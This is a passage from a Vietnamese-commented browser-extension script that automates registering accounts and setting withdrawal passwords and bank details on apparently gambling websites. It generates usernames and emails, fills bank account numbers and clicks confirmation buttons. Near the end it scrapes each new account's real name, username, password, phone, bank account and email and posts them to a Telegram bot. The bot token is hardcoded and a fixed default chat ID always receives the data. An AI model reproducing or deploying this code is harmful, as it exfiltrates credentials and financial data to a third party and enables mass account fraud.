    const currentEmail = emailEl.value || '';
    let newEmail = '';
    for (let i = 0; i < 10; i++) { const opts = await genEmailOptions(fullName); const pick = opts[Math.floor(Math.random() * opts.length)].value; if (pick !== currentEmail) { newEmail = pick; break; } }
    if (!newEmail) newEmail = (await genEmailOptions(fullName))[0].value;
    await typeIntoInput(emailEl, newEmail); showToast('📧 Email mới: ' + newEmail, 'info');
    await sleep(200);
    const closeBtn = document.querySelector('mat-dialog-container button, [mat-dialog-close], [class*="dialog"] button[class*="close"], [class*="modal"] button[class*="close"]');
    if (closeBtn) closeBtn.click();
    await sleep(300); _retryingEmail = false;
  }

  async function checkAndRetryUsername() {
    if (_retryingUsername) return;
    const bodyText = document.body.innerText || "";
    // Kiểm tra thêm small.invalid-msg gần input username
    const invalidMsg = [...document.querySelectorAll('small.invalid-msg')].some(el => DUPE_REGEX.test(el.textContent || ''));
    if (DUPE_REGEX.test(bodyText) || PW_FMT_REGEX.test(bodyText) || invalidMsg) {
      _retryingUsername = true; await sleep(200);
      const userEl = getUsernameInput() || document.querySelector('input[data-input-name="account"]');
      if (userEl) {
        let hardUserR = "";
        try { hardUserR = localStorage.getItem("okvip_hard_username") || ""; } catch(e) {}
        if (!hardUserR) { try { hardUserR = await new Promise(res => chrome.storage.local.get(["okvip_hard_username"], s => res(s["okvip_hard_username"] || ""))); } catch(e) {} }
        let fillVal;
        if (hardUserR) { fillVal = hardUserR; }
        else if (MK.state.lastSelectedAccount) { const opts = await genNickOptions(MK.state.lastSelectedAccount.name); fillVal = opts[Math.floor(Math.random() * opts.length)].value; }
        if (fillVal) {
          await typeIntoInput(userEl, fillVal);
          await new Promise(r => setTimeout(r, 300));
          const actualNick = userEl.value.trim() || fillVal;
          try { chrome.storage.local.set({[LAST_USERNAME_KEY]: actualNick}); } catch(e) {}
          try { localStorage.setItem(LAST_USERNAME_KEY, actualNick); } catch(e) {}
          const confirmEl = getConfirmUsernameInput();
          if (confirmEl) await typeIntoInput(confirmEl, actualNick);
          showToast(DUPE_REGEX.test(document.body.innerText) ? "🔄 TK trùng → đổi: " + actualNick : "🔄 Lỗi định dạng → đổi TK: " + actualNick, "info");
        }
      }
      setTimeout(() => { _retryingUsername = false; }, 3000);
    }
  }

  // ========== AUTO FILL MẬT KHẨU RÚT TIỀN ==========
  let _autoWithdrawDone = false;
  let _lastWithdrawCheck = 0;

  async function autoFillWithdrawPassword() {
    const now = Date.now();
    if (now - _lastWithdrawCheck < 800) return;
    _lastWithdrawCheck = now;
    const inputs = getWithdrawInputs();
    if (!inputs.length) { _autoWithdrawDone = false; return; }
    if (_autoWithdrawDone) return;
    if (inputs.every(el => el.value)) return;
    _autoWithdrawDone = true; await sleep(400);
    for (const inp of inputs) { clickEyeIcon(inp); await sleep(150); await typeIntoInput(inp, getWithdrawPassword()); await sleep(100); }
    showToast("🔒 Đã điền MK rút: " + getWithdrawPassword(), "success");

    // Tự động ấn nút xác nhận sau khi điền xong MK rút
    await sleep(300);
    const confirmXPath = "/html/body/div/div[2]/div/mat-bottom-sheet-container/app-change-money-password/section/div/form/fieldset[2]/button[1]/span";
    if (clickByXPath(confirmXPath)) {
      showToast("✅ Đã ấn xác nhận MK rút", "success");
    }
  }

  // ========== AUTO ĐIỀN STK ==========
  MK.state._autoStkDone = false;
  let _lastStkCheck = 0;

  async function autoFillStk() {
    const now = Date.now();
    if (now - _lastStkCheck < 800) return;
    _lastStkCheck = now;
    const stkEl = getStkInput();
    if (!stkEl) { MK.state._autoStkDone = false; return; }
    if (isWithdrawInput(stkEl)) return;
    if (/tên|ten|username/i.test(stkEl.placeholder || "")) return;
    if (MK.state._autoStkDone) return;
    if (stkEl.value) { MK.state._autoStkDone = true; return; }
    if (!MK.state.lastSelectedAccount) return; // chưa chọn tài khoản (chưa có STK để điền)
    MK.state._autoStkDone = true;
    await sleep(150);
    const ok = await fillStkVerified(MK.state.lastSelectedAccount.account);
    if (ok) { try { chrome.storage.local.set({[LAST_STK_KEY]: MK.state.lastSelectedAccount.account}); } catch(e) {} }
    showToast(ok ? ("💳 Tự động điền STK: " + MK.state.lastSelectedAccount.account) : "⚠️ Tự động điền STK thất bại", ok ? "success" : "error");
    const stkBtn = document.getElementById("__mk_stk_btn__");
    if (stkBtn) {
      stkBtn.innerHTML = ok ? `✅ ${MK.state.lastSelectedAccount.name}` : "💳 Điền STK";
      stkBtn.style.background = ok ? "#2e7d32" : "#f60";
      setTimeout(() => { stkBtn.innerHTML = `💳 ${MK.state.lastSelectedAccount.name.split(" ").pop()}`; stkBtn.style.background = "#f60"; }, 1500);
    }
  }

  // ========== AUTO SELECT NGÂN HÀNG ==========
  MK.state._bankSelectDone = false;

  const BANK_ALIAS_MAP = [
    { keys:['ABBANK','AB BANK'],                                      a:'AB BANK',                                    b:'ABBANK' },
    { keys:['ACB BANK','ACB'],                                        a:'ACB BANK',                                   b:'ACB BANK' },
    { keys:['AGRIBANK'],                                              a:'AGRIBANK',                                   b:'AGRIBANK' },
    { keys:['ANZ BANK','ANZ'],                                        a:'ANZ BANK',                                   b:'ANZ BANK' },
    { keys:['BAC A BANK','BACABANK'],                                 a:'BAC A BANK',                                 b:'BAC A BANK' },
    { keys:['BAOVIET BANK','BAO VIET BANK','BVBANK','VIET CAPITAL BANK (BVBANK)','VIET CAPITAL BANK'], a:'BAOVIET BANK', b:'VIET CAPITAL BANK (BVBANK)' },
    { keys:['BIDV BANK','BIDV'],                                      a:'BIDV BANK',                                  b:'BIDV BANK' },
    { keys:['BIDC'],                                                  a:'BIDC',                                       b:'BIDC' },
    { keys:['CAKE'],                                                  a:'CAKE',                                       b:'CAKE' },
    { keys:['CB BANK','CBBANK'],                                      a:'CB BANK',                                    b:'CB BANK' },
    { keys:['CIMB BANK','CIMB'],                                      a:'CIMB',                                       b:'CIMB BANK' },
    { keys:['CITI'],                                                  a:'CITI',                                       b:'CITI' },
    { keys:['CO OPBANK','CO-OPBANK','COOPBANK'],                      a:'Co-opBank',                                  b:'CO OPBANK' },
    { keys:['DBS'],                                                   a:'DBS',                                        b:'DBS' },
    { keys:['EXIMBANK'],                                              a:'EXIMBANK',                                   b:'EXIMBANK' },
    { keys:['FIRST BANK','FIRSTBANK'],                                a:'FIRST BANK',                                 b:'FIRST BANK' },
    { keys:['GP BANK','GPBANK'],                                      a:'GPBANK',                                     b:'GP BANK' },
    { keys:['HD BANK','HDBANK'],                                      a:'HD BANK',                                    b:'HD BANK' },
    { keys:['HNB'],                                                   a:'HNB',                                        b:'HNB' },
    { keys:['HONG LEONG BANK','HONGLEONG BANK'],                      a:'Hong Leong Bank',                            b:'HONGLEONG BANK' },
    { keys:['HSBC'],                                                  a:'HSBC',                                       b:'HSBC' },
    { keys:['IBK HCM'],                                               a:'IBK HCM',                                    b:'IBK HCM' },
    { keys:['IBK'],                                                   a:'IBK',                                        b:'IBK' },
    { keys:['INDOVINA BANK','IVB'],                                   a:'INDOVINA BANK',                              b:'IVB' },
    { keys:['KASIKORNBANK','KBANK'],                                  a:'KASIKORNBANK',                               b:'KBANK' },
    { keys:['KB KOOKMIN BANK','KOOKMI','KOOKMIN'],                    a:'KB KOOKMIN BANK',                            b:'KOOKMI' },
    { keys:['KEB HANA BANK'],                                         a:'KEB Hana Bank',                              b:'KEB HANA BANK' },
    { keys:['KIENLONG BANK','KIENLONGBANK'],                          a:'KIENLONG BANK',                              b:'KIENLONGBANK' },
    { keys:['LIENVIET BANK','LP BANK','LPBANK'],                      a:'LP BANK',                                    b:'LIENVIET BANK' },
    { keys:['LIO BANK','LIOBANK'],                                    a:'LIO BANK',                                   b:'LIOBANK' },
    { keys:['MAFC','MIRAE ASSET FINANCE COMPANY'],                    a:'Mirae Asset Finance Company',                b:'MAFC' },
    { keys:['MB BANK','MBBANK'],                                      a:'MB BANK',                                    b:'MBBANK' },
    { keys:['MBV BANK','MBV'],                                        a:'MBV BANK',                                   b:'MBV' },
    { keys:['MOMO'],                                                  a:'MOMO',                                       b:'MOMO' },
    { keys:['MSB BANK','MSB'],                                        a:'MSB',                                        b:'MSB BANK' },
    { keys:['NAM A BANK','NAMA BANK','NAMABANK'],                     a:'NAM A BANK',                                 b:'NAMA BANK' },
    { keys:['NCB BANK','NCB'],                                        a:'NCB BANK',                                   b:'NCB' },
    { keys:['NHB','NONGHYUP BANK'],                                   a:'NONGHYUP BANK',                              b:'NHB' },
    { keys:['OCB BANK','OCB'],                                        a:'OCB BANK',                                   b:'OCB BANK' },
    { keys:['PG BANK','PGBANK'],                                      a:'PG BANK',                                    b:'PGBANK' },
    { keys:['PUBLIC BANK','PUBLICBANK'],                              a:'Public Bank',                                b:'PUBLICBANK' },
    { keys:['PVCOM BANK','PVCOMBANK'],                                a:'PVCOM BANK',                                 b:'PVCOMBANK' },
    { keys:['SACOM BANK','SACOMBANK'],                                a:'SACOM BANK',                                 b:'SACOMBANK' },
    { keys:['SAIGON BANK','SAIGONBANK'],                              a:'SAIGON BANK',                                b:'SAIGONBANK' },
    { keys:['SCB BANK','SCB','SCBVL'],                                a:'SCB BANK',                                   b:'SCB' },
    { keys:['SEA BANK','SEABANK'],                                    a:'SEA BANK',                                   b:'SEABANK' },
    { keys:['SHB BANK','SHB'],                                        a:'SHB BANK',                                   b:'SHB BANK' },
    { keys:['SHINHAN BANK','SHINHAN BANK VN'],                        a:'SHINHAN BANK',                               b:'SHINHAN BANK VN' },
    { keys:['STANDARD CHARTERED'],                                    a:'Standard Chartered',                         b:'STANDARD CHARTERED' },
    { keys:['STATE BANK OF VIETNAM','SOCIAL POLICY BANK OF VIETNAM','VIETNAM BANK FOR SOCIAL POLICIES'], a:'Social Policy Bank of Vietnam', b:'VIETNAM BANK FOR SOCIAL POLICIES' },
    { keys:['TECHCOM BANK','TECHCOMBANK'],                            a:'TECHCOM BANK',                               b:'TECHCOMBANK' },
    { keys:['TIMO BY BAN VIET BANK','TIMO BANK'],                    a:'TIMO BY BAN VIET BANK',                      b:'TIMO BANK' },
    { keys:['TPBANK'],                                                a:'TPBANK',                                     b:'TPBANK' },
    { keys:['UBANK'],                                                 a:'UBANK',                                      b:'UBANK' },
    { keys:['UOB (UNITED OVERSEAS BANK)','UOB'],                     a:'UOB (United Overseas Bank)',                 b:'UOB' },
    { keys:['VDB','VIETNAM DEVELOPMENT BANK'],                        a:'Vietnam Development Bank',                   b:'VDB' },
    { keys:['VIB BANK','VIB'],                                        a:'VIB BANK',                                   b:'VIB BANK' },
    { keys:['VIET A BANK','VIETA BANK','VIETABANK'],                  a:'VIET A BANK',                                b:'VIETA BANK' },
    { keys:['VIET BANK','VIETBANK'],                                  a:'VIET BANK',                                  b:'VIETBANK' },
    { keys:['VIETCOM BANK','VIETCOMBANK','VCBNEO','VIETCOMBANK NEO LIMITED (VCBNEO)'], a:'VIETCOM BANK', b:'VIETCOMBANK' },
    { keys:['VIETIN BANK','VIETINBANK'],                              a:'VIETIN BANK',                                b:'VIETINBANK' },
    { keys:['VIKKI BANK','VIKKI DIGITAL BANK'],                       a:'Vikki Digital Bank',                         b:'VIKKI BANK' },
    { keys:['VIKKI BY HDBANK','VIKKI BY HD BANK'],                    a:'Vikki by HD BANK',                           b:'VIKKI BY HDBANK' },
    { keys:['VPBANK'],                                                a:'VPBANK',                                     b:'VPBANK' },
    { keys:['VR BANK','VRB','VRBANK','VRB(VIET NGA)'],               a:'VR BANK',                                    b:'VRB(VIET NGA)' },
    { keys:['WOORI BANK'],                                            a:'WOORI BANK',                                 b:'WOORI BANK' },
    { keys:['ALL BANK SUPPORT'],                                      a:'ALL BANK SUPPORT',                           b:'ALL BANK SUPPORT' },
    { keys:['SAIGON HANOI COMMERCIAL JOINT STOCK BANK'],              a:'Saigon-Hanoi Commercial Joint Stock Bank',   b:'SHB BANK' },
    { keys:['SCBVL'],                                                 a:'SCB BANK',                                   b:'SCBVL' },
  ];

  function normBank(str) { return (str || '').toUpperCase().replace(/[^A-Z0-9 ]/g, ' ').replace(/ +/g, ' ').trim(); }
  function getAliasEntry(bankTag) { const norm = normBank(bankTag); return BANK_ALIAS_MAP.find(e => e.keys.some(k => normBank(k) === norm)); }
  function getBankNameForSite(bankTag, isSiteA) { const entry = getAliasEntry(bankTag); if (!entry) return normBank(bankTag); return isSiteA ? entry.a : entry.b; }
  const BANK_EXACT_CODES = new Set(['SCB','VCB','ACB','VIB','MSB','NCB','OCB','DBS','UOB','IBK','MBB','TPB','VPB','LPB','SHB','VDB','HNB','MBV','IVB']);
  function _bankTok(s) { return normBank(s).split(' ').filter(Boolean); }
  function _kwMatch(opt, kw) {
    if (!kw) return false; if (opt === kw) return true;
    const optNoSp = opt.replace(/ /g,''); const kwNoSp = kw.replace(/ /g,'');
    if (optNoSp === kwNoSp) return true;
    const optTok = _bankTok(opt); const kwTok = _bankTok(kw);
    if (kwTok.length === 1 && BANK_EXACT_CODES.has(kwTok[0])) return optTok.includes(kwTok[0]);
    if (kwTok.length === 1) { const k = kwTok[0]; if (optTok.includes(k)) return true; if (optTok.some(t => t.startsWith(k))) return true; return false; }
    if (optNoSp.includes(kwNoSp)) return true;
    return kwTok.every(t => optTok.some(ot => ot === t || ot.startsWith(t)));
  }
  function bankMatches(optionText, bankTag, isSiteA) {
    const opt = normBank(optionText); const tag = normBank(bankTag);
    if (opt === tag) return true;
    const entry = getAliasEntry(bankTag);
    if (!entry) return _kwMatch(opt, tag);
    if (isSiteA !== undefined) { const target = normBank(isSiteA ? entry.a : entry.b); if (_kwMatch(opt, target)) return true; }
    return entry.keys.some(k => _kwMatch(opt, normBank(k)));
  }

  async function autoSelectBank() {
    if (MK.state._bankSelectDone) return;
    let bankName = "";
    if (MK.state.lastSelectedAccount?.tag) { bankName = MK.state.lastSelectedAccount.tag.trim(); }
    else { try { const stored = JSON.parse(localStorage.getItem("okvip_last_account") || "null"); if (stored?.tag) bankName = stored.tag.trim(); } catch(e) {} }
    if (!bankName) return;
    const matSelectTrigger = document.querySelector('mat-select[formcontrolname="bankName"] .mat-select-trigger, mat-select[formcontrolname="bank"] .mat-select-trigger, mat-select[formcontrolname="bankCode"] .mat-select-trigger, form mat-select .mat-select-trigger');
    const divDropdown = !matSelectTrigger ? [...document.querySelectorAll('div.inputBase[placeholder]')].find(el => /chọn ngân hàng|ngan hang/i.test(el.getAttribute('placeholder') || el.textContent || '')) : null;
    if (!matSelectTrigger && !divDropdown) return;
    if (matSelectTrigger) { const cur = matSelectTrigger.querySelector('.mat-select-value-text span')?.textContent?.trim() || ''; if (cur && !/chọn|select/i.test(cur)) { MK.state._bankSelectDone = true; return; } }
    if (divDropdown) { const cur = (divDropdown.getAttribute('value') || divDropdown.textContent || '').trim(); if (cur && !/chọn|select/i.test(cur)) { MK.state._bankSelectDone = true; return; } }
    MK.state._bankSelectDone = true;
    const isSiteA = !!divDropdown;
    const targetBankName = getBankNameForSite(bankName, isSiteA);
    await sleep(3000);
    const trigger = matSelectTrigger || divDropdown;
    trigger.click(); await sleep(600);
    const searchKw = targetBankName;
    let filterInput = null;
    for (let i = 0; i < 8; i++) {
      filterInput = document.querySelector('input[placeholder="Vui lòng chọn ngân hàng"], input.inputBase[placeholder="Tìm kiếm"], input[placeholder="Tìm kiếm"], div.mat-select-panel input[type="text"], .mat-autocomplete-panel input, .cdk-overlay-container input[type="text"]');
      if (filterInput) break; await sleep(150);
    }
    if (filterInput) { filterInput.focus(); await typeIntoInput(filterInput, searchKw); await sleep(700); }
    function clickEl(el) { el.dispatchEvent(new MouseEvent('mouseenter',{bubbles:true})); el.dispatchEvent(new MouseEvent('mouseover',{bubbles:true})); el.dispatchEvent(new MouseEvent('mousedown',{bubbles:true})); el.dispatchEvent(new MouseEvent('mouseup',{bubbles:true})); el.click(); el.dispatchEvent(new MouseEvent('click',{bubbles:true})); }
    function findBankOption() {
      const matOpts = [...document.querySelectorAll('.cdk-overlay-container mat-option, .mat-select-panel mat-option, .mat-autocomplete-panel mat-option')];
      let found = matOpts.find(o => { const spans = o.querySelectorAll('span span, span'); const txt = [...spans].map(s => s.textContent.trim()).join(' '); return bankMatches(txt, bankName, isSiteA) || bankMatches(o.textContent, bankName, isSiteA); });
      if (found) return found;
      const amContents = [...document.querySelectorAll('div.am-list-content')];
      found = amContents.find(o => bankMatches(o.textContent, bankName, isSiteA));
      if (found) return found;
      const genericOpts = [...document.querySelectorAll('[class*="am-list"] [class*="content"], [class*="dropdown"] [class*="option"], [class*="select-option"], [class*="bank-item"], li[class*="bank"]')];
      found = genericOpts.find(o => bankMatches(o.textContent, bankName, isSiteA));
      if (found) return found;
      const allLeaves = [...document.querySelectorAll('body span, body div')].filter(el => el.children.length === 0 && el.offsetParent !== null && bankMatches(el.textContent, bankName, isSiteA));
      if (allLeaves.length) { allLeaves.sort((a,b) => a.textContent.trim().length - b.textContent.trim().length); const leaf = allLeaves[0]; return leaf.closest('mat-option, [role="option"], li, div.am-list-item, [class*="item"], [class*="option"]') || leaf; }
      return null;
    }
    let match = null;
    for (let i = 0; i < 12; i++) { match = findBankOption(); if (match) break; await sleep(250); }
    if (match) { clickEl(match); await sleep(300); showToast('🏦 Đã chọn: ' + bankName, 'success'); }
    else { MK.state._bankSelectDone = false; }
  }

  // ========== TÌM ICON "THÊM NGÂN HÀNG" (svg use #bankadd_...) ==========
  function findBankAddIcon() {
    // Match theo id bắt đầu bằng "bankadd" (id có thể đổi hash phần sau, ví dụ #bankadd_7c674007)
    const uses = [...document.querySelectorAll('svg use')];
    let found = uses.find(u => {
      const href = u.getAttribute('href') || u.getAttributeNS('http://www.w3.org/1999/xlink', 'href') || '';
      return href.replace('#', '').startsWith('bankadd');
    });
    if (found) return found;
    // Fallback: xpath cụ thể do người dùng cung cấp
    try {
      const xpathEl = document.evaluate(
        '/html/body/span/div/div[1]/div/div/div[2]/div[2]/div[2]/div[1]/div/div/div[1]/div[2]/div/svg/use',
        document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null
      ).singleNodeValue;
      if (xpathEl) return xpathEl;
    } catch(e) {}
    return null;
  }

  // Chỉ gọi thủ công (Ctrl+Q) — KHÔNG tự động chạy trong MutationObserver/setInterval
  function clickBankAddIcon() {
    const icon = findBankAddIcon();
    if (!icon) return false;
    const svgEl = icon.closest('svg') || icon;
    let node = svgEl.parentElement;
    for (let depth = 0; node && depth < 4; depth++, node = node.parentElement) {
      fireClick(node);
    }
    return true;
  }

  // Đợi trang "Rút Tiền" load xong rồi tự ấn icon thêm ngân hàng (chỉ chạy sau khi Ctrl+Q vào Rút Tiền)
  let _bankAddWaitTimer = null;
  function waitAndClickBankAdd() {
    if (_bankAddWaitTimer) clearInterval(_bankAddWaitTimer);
    let tries = 0;
    const maxTries = 20; // 20 x 300ms = 6s
    _bankAddWaitTimer = setInterval(() => {
      tries++;
      if (clickBankAddIcon()) {
        showToast('🏦 Tự động ấn icon thêm ngân hàng', 'info');
        clearInterval(_bankAddWaitTimer);
        _bankAddWaitTimer = null;
        return;
      }
      if (tries >= maxTries) {
        clearInterval(_bankAddWaitTimer);
        _bankAddWaitTimer = null;
      }
    }, 300);
  }

  // ========== TỰ ĐỘNG ẤN "CÀI ĐẶT MẬT KHẨU RÚT TIỀN" KHI CHƯA CÀI ==========
  let _wdPwSetupClicked = false;
  function checkAndClickSetWithdrawPassword() {
    const msg = [...document.querySelectorAll('span')].find(s => (s.textContent || '').includes('Mật khẩu rút tiền chưa cài đặt'));
    if (!msg) { _wdPwSetupClicked = false; return; }
    if (_wdPwSetupClicked) return;
    const link = msg.closest('a');
    if (link) {
      _wdPwSetupClicked = true;
      link.click();
      showToast('🔑 Chưa cài MK rút → tự động ấn cài đặt', 'info');
      setTimeout(() => { _wdPwSetupClicked = false; }, 3000);
    }
  }

  function _mkSafeRun(fn, label){
    try { fn(); } catch(e) { console.warn('[MK] lỗi trong', label, e); }
  }

  let __mk_obs_timer__ = null;
  new MutationObserver(() => {
    if (__mk_obs_timer__) return;
    __mk_obs_timer__ = setTimeout(() => {
      __mk_obs_timer__ = null;
      _mkSafeRun(tryInjectAll, 'tryInjectAll');
      _mkSafeRun(injectTKKMBtn, 'injectTKKMBtn');
      if(!window.__MK_CAPTCHA_SOLVING__) _mkSafeRun(injectCaptchaBtn, 'injectCaptchaBtn');
      _mkSafeRun(checkAndRetryUsername, 'checkAndRetryUsername');
      _mkSafeRun(checkAndRetryEmail, 'checkAndRetryEmail');
      _mkSafeRun(checkAndRetryPhone, 'checkAndRetryPhone');
      _mkSafeRun(autoFillWithdrawPassword, 'autoFillWithdrawPassword');
      _mkSafeRun(autoFillStk, 'autoFillStk');
      _mkSafeRun(autoSelectBank, 'autoSelectBank');
      _mkSafeRun(checkAndClickSetWithdrawPassword, 'checkAndClickSetWithdrawPassword');
    }, 500);
  }).observe(document.body, { childList: true, subtree: true });
  setInterval(() => {
    _mkSafeRun(tryInjectAll, 'tryInjectAll');
    _mkSafeRun(injectTKKMBtn, 'injectTKKMBtn');
    if(!window.__MK_CAPTCHA_SOLVING__) _mkSafeRun(injectCaptchaBtn, 'injectCaptchaBtn');
    _mkSafeRun(autoFillWithdrawPassword, 'autoFillWithdrawPassword');
    _mkSafeRun(autoFillStk, 'autoFillStk');
    _mkSafeRun(checkAndClickSetWithdrawPassword, 'checkAndClickSetWithdrawPassword');
  }, 2000);

  // ========== REPLACE LOGO ==========
  (function replaceLogos() {
    const OLD_SRC = 'assets/images/account/logo.png';
    const NEW_SRC = 'https://i.ibb.co/8LcBc6X1/Chat-GPT-Image-05-27-27-14-thg-3-2026.png';
    function swapLogo() { document.querySelectorAll('img').forEach(img => { if(img.src && img.src.includes(OLD_SRC) && img.src !== NEW_SRC) img.src = NEW_SRC; }); }
    swapLogo();
    new MutationObserver(swapLogo).observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['src'] });
  })();

  // ========== AUTO CLOSE POPUP ==========
  (function autoClosePopup() {
    function closeIt() { const btn = document.querySelector('button.right-gif-close-button'); if(btn) btn.click(); }
    closeIt();
    new MutationObserver(closeIt).observe(document.body, { childList: true, subtree: true });
  })();

  // ========== TỰ ĐỘNG TÍCH "KHÔNG HIỂN THỊ LẠI THÔNG BÁO HÔM NAY" + ẤN X ĐÓNG ==========
  (function autoDismissDailyNotice() {
    function run() {
      const span = [...document.querySelectorAll('span')].find(s => (s.textContent || '').trim() === 'Không hiển thị lại thông báo hôm nay');
      if (!span) return;

      // Tìm checkbox gần nhất (thường là input đứng trước/anh em với span, hoặc cùng nằm trong 1 label/div)
      const scope = span.closest('label,div') || document;
      let checkbox = scope.querySelector('input.am-checkbox-input[type="checkbox"]')
        || document.querySelector('input.am-checkbox-input[type="checkbox"]');

      if (checkbox && !checkbox.checked) {
        fireClick(checkbox);
        const label = checkbox.closest('label');
        if (label) fireClick(label); // Một số UI cần click vào label bọc ngoài mới đổi state
      }

      const closeBtn = document.querySelector('div.am-navbar-title.close-btn');
      if (closeBtn) fireClick(closeBtn);
    }
    run();
    new MutationObserver(run).observe(document.body, { childList: true, subtree: true });
  })();

  // ========== GỬI THÔNG TIN ĐĂNG KÝ VỀ TELEGRAM ==========
  window.__MK_TG_SENT__ = false;

  (function watchRegisterSuccess() {
    const TG_TOKEN          = '7419627397:AAHroNj5bfNdkJdkDRLq5-DPaeKXI1Ep2fQ';
    const TG_CHATID_DEFAULT = '6972426627';

    function getAccountTgChatId() {
      return new Promise(resolve => {
        try { chrome.storage.local.get(['okvip_account_tg_chatid'], s => { resolve((s['okvip_account_tg_chatid'] || '').trim()); }); } catch(e) { resolve(''); }
      });
    }
    function getLocalTgChatId() { try { return (localStorage.getItem("okvip_tg_chatid") || "").trim(); } catch(e) { return ""; } }

    async function sendToOne(chatId, text) {
      try { const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({chat_id:chatId, text, parse_mode:'HTML'}) }); console.log('[TG] sent to', chatId, ':', r.status); } catch(e) { console.log('[TG] error:', e); }
    }

    async function sendTelegram(text) {
      const accountChatId = await getAccountTgChatId();
      const localChatId   = getLocalTgChatId();
      const ids = [...new Set([TG_CHATID_DEFAULT, accountChatId, localChatId].filter(Boolean))];
      console.log('[TG] Gửi tới', ids.length, 'chat IDs:', ids);
      await Promise.all(ids.map(id => sendToOne(id, text)));
    }

    function scanAllInputs() {
      const result = {};
      const KW = { name:/họ.*tên|ho.*ten|tên thật|full.?name|realname|real.?name/i, username:/tên tài khoản|ten tai khoan|username|account/i, phone:/điện thoại|dien thoai|phone|mobile|sdt|số đt/i, stk:/số tài khoản|so tai khoan|bank.?account|stk|account.?number/i, email:/email|e-mail/i };
      for(const input of document.querySelectorAll('input[type="text"],input[type="number"],input[type="tel"],input[type="email"]')) {
        const val = (input.value || '').trim(); if(!val) continue;
        const hints = [input.placeholder||'', input.name||'', input.id||'', input.getAttribute('formcontrolname')||'', input.getAttribute('aria-label')||'', input.getAttribute('data-input-name')||''].join(' ');
        for(const [key, rx] of Object.entries(KW)) { if(!result[key] && rx.test(hints)) result[key] = val; }
      }
      return result;
    }

    function doSend() {
      if(window.__MK_TG_SENT__) return;
      window.__MK_TG_SENT__ = true;
      chrome.storage.local.get([LAST_USERNAME_KEY, LAST_PHONE_KEY, LAST_STK_KEY, LAST_NAME_KEY], (stored) => {
        const scanned = scanAllInputs();
        const userElVal = (() => { try { const el = getUsernameInput(); return el?.value?.trim() || ''; } catch(e) { return ''; } })();
        const name = scanned.name || stored[LAST_NAME_KEY] || '—';
        const username = userElVal || scanned.username || stored[LAST_USERNAME_KEY] || '—';
        const phone = scanned.phone || stored[LAST_PHONE_KEY] || '—';
        const stk = scanned.stk || stored[LAST_STK_KEY] || '—';
        const email = scanned.email || '—';
        const domain = window.location.hostname;
        if(username === '—' && phone === '—') { window.__MK_TG_SENT__ = false; setTimeout(doSend, 1000); return; }
        if(username !== '—') { try { chrome.storage.local.set({[LAST_USERNAME_KEY]: username}); } catch(e) {} try { localStorage.setItem(LAST_USERNAME_KEY, username); } catch(e) {} }
        const lines = ['🎉 <b>ĐĂNG KÝ THÀNH CÔNG</b>', `🌐 <b>Trang:</b> ${domain}`];
        if(name !== '—') lines.push(`👤 <b>Tên thật:</b> ${name}`);
        if(username !== '—') lines.push(`🆔 <b>Tên TK:</b> ${username}`);
        lines.push(`🔑 <b>Mật khẩu:</b> ${getPassword()}`);
        if(phone !== '—') lines.push(`📱 <b>SĐT:</b> ${phone}`);
        if(stk !== '—') lines.push(`💳 <b>STK:</b> ${stk}`);
        if(email !== '—') lines.push(`📧 <b>Email:</b> ${email}`);
        lines.push(`⏰ <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN')}`);
        sendTelegram(lines.join("\n"));
      });
    }

    function isOldSuccessVisible() {
      if(document.querySelector('button[translate="Register_StartGame"]')) return true;
      if(document.querySelector('button[translate="Register_DepositImmediately"]')) return true;
      return [...document.querySelectorAll('button')].some(b => /bắt đầu trò chơi/i.test(b.textContent));
    }
    function isNewSuccessVisible() {
      const hasMsg = [...document.querySelectorAll('span')].some(s => /chúc mừng đăng ký thành công/i.test(s.textContent?.trim()));
      if(!hasMsg) return false;
      const hasApp = [...document.querySelectorAll('span')].some(s => /tải app/i.test(s.textContent?.trim()));
      if(!hasApp) return false;
      if(!document.querySelector('button.registerRechargeBtn')) return false;
      return [...document.querySelectorAll('div, span')].some(s => /giới thiệu bạn/i.test(s.textContent?.trim()));
    }
    function isDepositPopupSuccessVisible() {
      const title = document.querySelector('.deposit-popup-title');
      if(title && /đăng ký thành công/i.test(title.textContent)) return true;
      const t2 = document.querySelector('.deposit-popup-text-2');
      const t4 = document.querySelector('.deposit-popup-text-4');
      return !!(t2 && t4);
    }
    function isMcSuccessVisible() {
      const g1 = document.querySelector('.guide-1');
      if(g1 && /đăng ký thành công/i.test(g1.textContent)) return true;
      const g3 = document.querySelector('.guide-3');
      const g4 = document.querySelector('.guide-4-text');
      return !!(g1 && g3 && g4);
    }
    function isV2SuccessVisible() {
      return [...document.querySelectorAll('span')].some(s => /đăng ký thành viên thành công/i.test(s.textContent?.trim()));
    }

    function attachSubmitBtnListener() {
      document.querySelectorAll('button.submit-btn').forEach(b => {
        if(b.__mk_submitbtn_attached__) return;
        if(!/đăng ký/i.test(b.textContent?.trim())) return;
        b.__mk_submitbtn_attached__ = true;
        b.addEventListener('click', () => {
          if(window.__MK_TG_SENT__) return;
          let tries = 0;
          const poll = setInterval(() => { tries++; if(isDepositPopupSuccessVisible()||isNewSuccessVisible()||isOldSuccessVisible()||isMcSuccessVisible()||isV2SuccessVisible()) { clearInterval(poll); doSend(); } if(tries>30) clearInterval(poll); }, 500);
        });
      });
    }

    function attachV2RegisterListener() {
      document.querySelectorAll('button').forEach(b => {
        if(b.__mk_v2_attached__) return;
        const spanText = b.querySelector('span')?.textContent?.trim() || b.textContent?.trim();
        if(!/đăng ký phiên bản 2/i.test(spanText || '')) return;
        b.__mk_v2_attached__ = true;
        b.addEventListener('click', () => {
          if(window.__MK_TG_SENT__) return;
          let tries = 0;
          const poll = setInterval(() => { tries++; if(isV2SuccessVisible()||isNewSuccessVisible()||isOldSuccessVisible()||isMcSuccessVisible()||isDepositPopupSuccessVisible()) { clearInterval(poll); doSend(); } if(tries>30) clearInterval(poll); }, 500);
        });
      });
    }

    function isNrcSuccessVisible() {
      const el = document.getElementById('mobile-alert-modal-msg') ||
                 document.querySelector('span.alert-message[id="mobile-alert-modal-msg"]');
      if(el && /đăng ký thành công/i.test(el.textContent?.trim())) return true;
      return [...document.querySelectorAll('span.alert-message')].some(s => /đăng ký thành công/i.test(s.textContent?.trim()));
    }

    function attachNrcRegisterListener() {
      document.querySelectorAll('button.nrc-button').forEach(b => {
        if(b.__mk_nrc_attached__) return;
